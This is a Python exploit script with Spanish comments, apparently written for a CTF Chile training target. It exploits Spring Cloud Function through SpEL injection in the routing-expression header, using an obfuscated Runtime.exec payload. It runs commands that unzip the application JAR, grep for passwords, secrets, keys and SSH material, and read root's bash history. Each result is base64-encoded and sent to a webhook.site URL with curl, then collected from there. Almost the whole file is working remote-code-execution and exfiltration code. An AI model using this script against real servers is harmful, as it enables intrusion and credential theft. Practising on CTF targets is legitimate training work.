#!/usr/bin/env python3
"""
CTF Chile - Extracción completa del JAR y búsqueda de credenciales
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Extracción completa del JAR...")

# Extraer JAR en directorio temporal
probe("create_workdir", "rm -rf /tmp/jar_extract && mkdir -p /tmp/jar_extract && cd /tmp/jar_extract")
probe("extract_complete", "cd /tmp/jar_extract && unzip -q /app/app.jar >/dev/null 2>&1 && echo 'JAR_EXTRACTED' && ls -la")

print("[*] Buscando archivos de propiedades y configuración...")

probe("find_props", "cd /tmp/jar_extract && find . -name '*.properties' -o -name '*.yml' -o -name '*.yaml' -o -name '*.conf' | head -10")
probe("app_properties", "cd /tmp/jar_extract && cat application.properties 2>/dev/null || echo 'NO_APP_PROPS'")
probe("bootstrap_props", "cd /tmp/jar_extract && cat bootstrap.properties 2>/dev/null || echo 'NO_BOOTSTRAP'")

print("[*] Buscando credenciales y secretos...")

# Buscar en archivos de configuración
probe("search_passwords", "cd /tmp/jar_extract && find . -type f \\( -name '*.properties' -o -name '*.yml' -o -name '*.yaml' \\) -exec grep -i 'password\\|secret\\|key\\|token\\|ssh' {} \\;")

# Buscar en archivos estáticos
probe("search_html_secrets", "cd /tmp/jar_extract && find . -name '*.html' -exec grep -i 'password\\|secret\\|admin\\|key' {} \\; | head -10")

# Buscar en archivos JavaScript
probe("search_js_secrets", "cd /tmp/jar_extract && find . -name '*.js' -exec grep -i 'password\\|secret\\|admin\\|ssh\\|key' {} \\; | head -10")

print("[*] Buscando flags en el contenido del JAR...")

# Buscar flags directamente en archivos
probe("flag_in_files", "cd /tmp/jar_extract && find . -type f -exec grep -l 'ctfchile{' {} \\; 2>/dev/null")
probe("flag_in_strings", "cd /tmp/jar_extract && find . -name '*.class' -exec strings {} \\; | grep -i 'ctfchile\\|flag{' | head -5")

print("[*] Explorando estructura de clases Java...")

probe("java_structure", "cd /tmp/jar_extract && find . -name '*.class' | head -20")
probe("main_class", "cd /tmp/jar_extract && cat META-INF/MANIFEST.MF | grep -i 'main-class\\|start-class'")

print("[*] Buscando archivos de base de datos embebidas...")

probe("db_files", "cd /tmp/jar_extract && find . -name '*.db' -o -name '*.sqlite' -o -name '*.h2*' | head -5")
probe("sql_scripts", "cd /tmp/jar_extract && find . -name '*.sql' | xargs cat 2>/dev/null | head -20")

print("[*] Verificando archivos ocultos del sistema...")

# Revisar archivos de historia bash por si hay comandos útiles
probe("bash_history", "cat /root/.bash_history 2>/dev/null | tail -20")

# Buscar archivos recientes
probe("recent_files", "find /root /app /tmp -type f -newermt '1 hour ago' 2>/dev/null | head -10")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=30", timeout=10)
data = r.json().get("data", [])

credentials_found = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar credenciales
            if any(keyword in decoded.lower() for keyword in ["password", "secret", "ssh", "key"]):
                if "=" in decoded or ":" in decoded:  # Posibles configuraciones
                    credentials_found.append(decoded)
                    print("🔑 POSIBLES CREDENCIALES ENCONTRADAS")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append(decoded)
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if credentials_found:
    print(f"\n🔑 CREDENCIALES POTENCIALES: {len(credentials_found)}")
if flags_found:
    print(f"🎉 FLAGS ENCONTRADOS: {len(flags_found)}")
    for flag in flags_found:
        print(f"  {flag}")